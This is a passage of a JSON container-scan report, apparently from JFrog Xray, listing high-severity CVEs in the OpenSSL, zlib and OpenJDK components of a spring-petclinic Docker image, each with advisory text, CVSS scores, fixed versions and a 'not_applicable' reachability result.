                     "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "There is a type confusion vulnerability relating to X.400 address processing\ninside an X.509 GeneralName. X.400 addresses were parsed as an ASN1_STRING but\nthe public structure definition for GENERAL_NAME incorrectly specified the type\nof the x400Address field as ASN1_TYPE. This field is subsequently interpreted by\nthe OpenSSL function GENERAL_NAME_cmp as an ASN1_TYPE rather than an\nASN1_STRING.\n\nWhen CRL checking is enabled (i.e. the application sets the\nX509_V_FLAG_CRL_CHECK flag), this vulnerability may allow an attacker to pass\narbitrary pointers to a memcmp call, enabling them to read memory contents or\nenact a denial of service. In most cases, the attack requires the attacker to\nprovide both the certificate chain and CRL, neither of which need to have a\nvalid signature. If the attacker only controls one of these inputs, the other\ninput must already contain an X.400 address as a CRL distribution point, which\nis uncommon. As such, this vulnerability is most likely to only affect\napplications which have implemented their own functionality for retrieving CRLs\nover a network.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0286",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0286",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607949",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The function PEM_read_bio_ex() reads a PEM file from a BIO and parses and\ndecodes the \"name\" (e.g. \"CERTIFICATE\"), any header data and the payload data.\nIf the function succeeds then the \"name_out\", \"header\" and \"data\" arguments are\npopulated with pointers to buffers containing the relevant decoded data. The\ncaller is responsible for freeing those buffers. It is possible to construct a\nPEM file that results in 0 bytes of payload data. In this case PEM_read_bio_ex()\nwill return a failure code but will populate the header argument with a pointer\nto a buffer that has already been freed. If the caller also frees this buffer\nthen a double free will occur. This will most likely lead to a crash. This\ncould be exploited by an attacker who has the ability to supply malicious PEM\nfiles for parsing to achieve a denial of service attack.\n\nThe functions PEM_read_bio() and PEM_read() are simple wrappers around\nPEM_read_bio_ex() and therefore these functions are also directly affected.\n\nThese functions are also called indirectly by a number of other OpenSSL\nfunctions including PEM_X509_INFO_read_bio_ex() and\nSSL_CTX_use_serverinfo_file() which are also vulnerable. Some OpenSSL internal\nuses of these functions are not vulnerable because the caller does not free the\nheader argument if PEM_read_bio_ex() returns a failure code. These locations\ninclude the PEM_read_bio_TYPE() functions as well as the decoders introduced in\nOpenSSL 3.0.\n\nThe OpenSSL asn1parse command line application is also impacted by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 1.1.1t-r0"
            ],
            "fixed_versions": [
               "1.1.1t-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4450",
                     "cwe": [
                        "CWE-415"
                     ],
                     "cwe_details": {
                        "CWE-415": {
                           "name": "Double Free",
                           "description": "The product calls free() twice on the same memory address, potentially leading to modification of unexpected memory locations."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "The function PEM_read_bio_ex() reads a PEM file from a BIO and parses and\ndecodes the \"name\" (e.g. \"CERTIFICATE\"), any header data and the payload data.\nIf the function succeeds then the \"name_out\", \"header\" and \"data\" arguments are\npopulated with pointers to buffers containing the relevant decoded data. The\ncaller is responsible for freeing those buffers. It is possible to construct a\nPEM file that results in 0 bytes of payload data. In this case PEM_read_bio_ex()\nwill return a failure code but will populate the header argument with a pointer\nto a buffer that has already been freed. If the caller also frees this buffer\nthen a double free will occur. This will most likely lead to a crash. This\ncould be exploited by an attacker who has the ability to supply malicious PEM\nfiles for parsing to achieve a denial of service attack.\n\nThe functions PEM_read_bio() and PEM_read() are simple wrappers around\nPEM_read_bio_ex() and therefore these functions are also directly affected.\n\nThese functions are also called indirectly by a number of other OpenSSL\nfunctions including PEM_X509_INFO_read_bio_ex() and\nSSL_CTX_use_serverinfo_file() which are also vulnerable. Some OpenSSL internal\nuses of these functions are not vulnerable because the caller does not free the\nheader argument if PEM_read_bio_ex() returns a failure code. These locations\ninclude the PEM_read_bio_TYPE() functions as well as the decoders introduced in\nOpenSSL 3.0.\n\nThe OpenSSL asn1parse command line application is also impacted by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-4450",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-4450",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607949",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The function PEM_read_bio_ex() reads a PEM file from a BIO and parses and\ndecodes the \"name\" (e.g. \"CERTIFICATE\"), any header data and the payload data.\nIf the function succeeds then the \"name_out\", \"header\" and \"data\" arguments are\npopulated with pointers to buffers containing the relevant decoded data. The\ncaller is responsible for freeing those buffers. It is possible to construct a\nPEM file that results in 0 bytes of payload data. In this case PEM_read_bio_ex()\nwill return a failure code but will populate the header argument with a pointer\nto a buffer that has already been freed. If the caller also frees this buffer\nthen a double free will occur. This will most likely lead to a crash. This\ncould be exploited by an attacker who has the ability to supply malicious PEM\nfiles for parsing to achieve a denial of service attack.\n\nThe functions PEM_read_bio() and PEM_read() are simple wrappers around\nPEM_read_bio_ex() and therefore these functions are also directly affected.\n\nThese functions are also called indirectly by a number of other OpenSSL\nfunctions including PEM_X509_INFO_read_bio_ex() and\nSSL_CTX_use_serverinfo_file() which are also vulnerable. Some OpenSSL internal\nuses of these functions are not vulnerable because the caller does not free the\nheader argument if PEM_read_bio_ex() returns a failure code. These locations\ninclude the PEM_read_bio_TYPE() functions as well as the decoders introduced in\nOpenSSL 3.0.\n\nThe OpenSSL asn1parse command line application is also impacted by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 1.1.1t-r0"
            ],
            "fixed_versions": [
               "1.1.1t-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4450",
                     "cwe": [
                        "CWE-415"
                     ],
                     "cwe_details": {
                        "CWE-415": {
                           "name": "Double Free",
                           "description": "The product calls free() twice on the same memory address, potentially leading to modification of unexpected memory locations."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "The function PEM_read_bio_ex() reads a PEM file from a BIO and parses and\ndecodes the \"name\" (e.g. \"CERTIFICATE\"), any header data and the payload data.\nIf the function succeeds then the \"name_out\", \"header\" and \"data\" arguments are\npopulated with pointers to buffers containing the relevant decoded data. The\ncaller is responsible for freeing those buffers. It is possible to construct a\nPEM file that results in 0 bytes of payload data. In this case PEM_read_bio_ex()\nwill return a failure code but will populate the header argument with a pointer\nto a buffer that has already been freed. If the caller also frees this buffer\nthen a double free will occur. This will most likely lead to a crash. This\ncould be exploited by an attacker who has the ability to supply malicious PEM\nfiles for parsing to achieve a denial of service attack.\n\nThe functions PEM_read_bio() and PEM_read() are simple wrappers around\nPEM_read_bio_ex() and therefore these functions are also directly affected.\n\nThese functions are also called indirectly by a number of other OpenSSL\nfunctions including PEM_X509_INFO_read_bio_ex() and\nSSL_CTX_use_serverinfo_file() which are also vulnerable. Some OpenSSL internal\nuses of these functions are not vulnerable because the caller does not free the\nheader argument if PEM_read_bio_ex() returns a failure code. These locations\ninclude the PEM_read_bio_TYPE() functions as well as the decoders introduced in\nOpenSSL 3.0.\n\nThe OpenSSL asn1parse command line application is also impacted by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-4450",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-4450",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607947",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "zlib before 1.2.12 allows memory corruption when deflating (i.e., when compressing) if the input has many distant matches.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:zlib",
         "source_id": "alpine://3.14:zlib",
         "source_comp_id": "alpine://3.14:zlib:1.2.11-r3",
         "component_versions": {
            "id": "3.14:zlib",
            "vulnerable_versions": [
               "< 1.2.11-r4"
            ],
            "fixed_versions": [
               "1.2.11-r4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2018-25032",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "zlib before 1.2.12 allows memory corruption when deflating (i.e., when compressing) if the input has many distant matches.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:zlib:1.2.11-r3",
            "cve_id": "CVE-2018-25032",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:zlib:1.2.11-r3",
            "vulnerability_id": "CVE-2018-25032",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-589164",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "11.0 ≤ Version ≤ 11.0.21",
               "17.0 ≤ Version ≤ 17.0.9",
               "21.0 ≤ Version ≤ 21.0.1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-20918",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc"
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "cpp://oracle:openjdk:17",
            "cve_id": "CVE-2024-20918",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable flag '-XX:+NeverActAsServerClassMachine' is not found, The vulnerable flag '-XX:TieredStopAtLevel' is not found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "cpp://oracle:openjdk:17",
            "vulnerability_id": "CVE-2024-20918",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-522768",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The openssl gem for Ruby uses the same initialization vector (IV) in GCM Mode (aes-*-gcm) when the IV is set before the key, which makes it easier for context-dependent attackers to bypass the encryption protection mechanism.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "≤ 1.1.1t-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2016-7798",
                     "cwe": [
                        "CWE-326"
                     ],
                     "cwe_details": {
                        "CWE-326": {
                           "name": "Inadequate Encryption Strength",
                           "description": "The product stores or transmits sensitive data using an encryption scheme that is theoretically sound, but is not strong enough for the level of protection required."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "The openssl gem for Ruby uses the same initialization vector (IV) in GCM Mode (aes-*-gcm) when the IV is set before the key, which makes it easier for context-dependent attackers to bypass the encryption protection mechanism.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2016-7798",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Vulnerable AES gcm encryption is not set",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2016-7798",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-522768",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The openssl gem for Ruby uses the same initialization vector (IV) in GCM Mode (aes-*-gcm) when the IV is set before the key, which makes it easier for context-dependent attackers to bypass the encryption protection mechanism.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "≤ 1.1.1t-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2016-7798",
                     "cwe": [
                        "CWE-326"
                     ],
                     "cwe_details": {
                        "CWE-326": {
                           "name": "Inadequate Encryption Strength",
                           "description": "The product stores or transmits sensitive data using an encryption scheme that is theoretically sound, but is not strong enough for the level of protection required."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "The openssl gem for Ruby uses the same initialization vector (IV) in GCM Mode (aes-*-gcm) when the IV is set before the key, which makes it easier for context-dependent attackers to bypass the encryption protection mechanism.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2016-7798",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Vulnerable AES gcm encryption is not set",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2016-7798",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-428306",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A security vulnerability has been identified in all supported versions\n\nof OpenSSL related to the verification of X.509 certificate chains\nthat include policy constraints.  Attackers may be able to exploit this\nvulnerability by creating a malicious certificate chain that triggers\nexponential use of computational resources, leading to a denial-of-service\n(DoS) attack on affected systems.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 1.1.1t-r1"
            ],
            "fixed_versions": [
               "1.1.1t-r1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0464",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A security vulnerability has been identified in all supported versions\n\nof OpenSSL related to the verification of X.509 certificate chains\nthat include policy constraints.  Attackers may be able to exploit this\nvulnerability by creating a malicious certificate chain that triggers\nexponential use of computational resources, leading to a denial-of-service\n(DoS) attack on affected systems.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0464",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0464",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-428306",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A security vulnerability has been identified in all supported versions\n\nof OpenSSL related to the verification of X.509 certificate chains\nthat include policy constraints.  Attackers may be able to exploit this\nvulnerability by creating a malicious certificate chain that triggers\nexponential use of computational resources, leading to a denial-of-service\n(DoS) attack on affected systems.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 1.1.1t-r1"
            ],
            "fixed_versions": [
               "1.1.1t-r1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0464",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A security vulnerability has been identified in all supported versions\n\nof OpenSSL related to the verification of X.509 certificate chains\nthat include policy constraints.  Attackers may be able to exploit this\nvulnerability by creating a malicious certificate chain that triggers\nexponential use of computational resources, leading to a denial-of-service\n(DoS) attack on affected systems.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0464",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0464",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-183483",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "ASN.1 strings are represented internally within OpenSSL as an ASN1_STRING structure which contains a buffer holding the string data and a field holding the buffer length. This contrasts with normal C strings which are repesented as a buffer for the string data which is terminated with a NUL (0) byte. Although not a strict requirement, ASN.1 strings that are parsed using OpenSSL's own \"d2i\" functions (and other similar parsing functions) as well as any string whose value has been set with the ASN1_STRING_set() function will additionally NUL terminate the byte array in the ASN1_STRING structure. However, it is possible for applications to directly construct valid ASN1_STRING structures which do not NUL terminate the byte array by directly setting the \"data\" and \"length\" fields in the ASN1_STRING array. This can also happen by using the ASN1_STRING_set0() function. Numerous OpenSSL functions that print ASN.1 data have been found to assume that the ASN1_STRING byte array will be NUL terminated, even though this is not guaranteed for strings that have been directly constructed. Where an application requests an ASN.1 structure to be printed, and where that ASN.1 structure contains ASN1_STRINGs that have been directly constructed by the application without NUL terminating the \"data\" field, then a read buffer overrun can occur. The same thing can also occur during name constraints processing of certificates (for example if a certificate has been directly constructed by the application instead of loading it via the OpenSSL parsing functions, and the certificate contains non NUL terminated ASN1_STRING structures). It can also occur in the X509_get1_email(), X509_REQ_get1_email() and X509_get1_ocsp() functions. If a malicious actor can cause an application to directly construct an ASN1_STRING and then process it through one of the affected OpenSSL functions then this issue could be hit. This might result in a crash (causing a Denial of Service attack). It could also result in the disclosure of private memory content...",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 1.1.1l-r0"
            ],
            "fixed_versions": [
               "1.1.1l-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-3712",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "5.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:P",
                     "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "ASN.1 strings are represented internally within OpenSSL as an ASN1_STRING structure which contains a buffer holding the string data and a field holding the buffer length. This contrasts with normal C strings which are repesented as a buffer for the string data which is terminated with a NUL (0) byte. Although not a strict requirement, ASN.1 strings that are parsed using OpenSSL's own \"d2i\" functions (and other similar parsing functions) as well as any string whose value has been set with the ASN1_STRING_set() function will additionally NUL terminate the byte array in the ASN1_STRING structure. However, it is possible for applications to directly construct valid ASN1_STRING structures which do not NUL terminate the byte array by directly setting the \"data\" and \"length\" fields in the ASN1_STRING array. This can also happen by using the ASN1_STRING_set0() function. Numerous OpenSSL functions that print ASN.1 data have been found to assume that the ASN1_STRING byte array will be NUL terminated, even though this is not guaranteed for strings that have been directly constructed. Where an application requests an ASN.1 structure to be printed, and where that ASN.1 structure contains ASN1_STRINGs that have been directly constructed by the application without NUL terminating the \"data\" field, then a read buffer overrun can occur. The same thing can also occur during name constraints processing of certificates (for example if a certificate has been directly constructed by the application instead of loading it via the OpenSSL parsing functions, and the certificate contains non NUL terminated ASN1_STRING structures). It can also occur in the X509_get1_email(), X509_REQ_get1_email() and X509_get1_ocsp() functions. If a malicious actor can cause an application to directly construct an ASN1_STRING and then process it through one of the affected OpenSSL functions then this issue could be hit. This might result in a crash (causing a Denial of Service attack). It could also result in the disclosure of private memory content...",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
